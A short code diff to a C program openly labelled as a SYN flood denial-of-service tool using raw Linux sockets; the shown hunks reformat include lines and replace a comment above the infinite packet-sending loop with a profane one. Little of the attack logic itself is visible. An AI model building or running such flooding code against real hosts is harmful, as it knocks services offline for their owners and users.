@@ -1,14 +1,14 @@
 /*
     Syn Flood DOS with LINUX sockets
 */
-#include<stdio.h>
-#include<string.h> //memset
-#include<sys/socket.h>
-#include<stdlib.h> //for exit(0);
-#include<errno.h> //For errno - the error number
-#include<netinet/tcp.h>   //Provides declarations for tcp header
-#include<netinet/ip.h>    //Provides declarations for ip header
-#include<math.h>
+#include <stdio.h>
+#include <string.h> //memset
+#include <sys/socket.h>
+#include <stdlib.h> //for exit(0);
+#include <errno.h> //For errno - the error number
+#include <netinet/tcp.h>   //Provides declarations for tcp header
+#include <netinet/ip.h>    //Provides declarations for ip header
+#include <math.h>
  
 struct pseudo_header    //needed for checksum calculation
 {
@@ -117,7 +117,7 @@ int main (void)
         exit(0);
     }
      
-    //Uncommend the loop if you want to flood :)
+    //SYN FLOOD fucker
     while (1)
     {
         //Send the packet
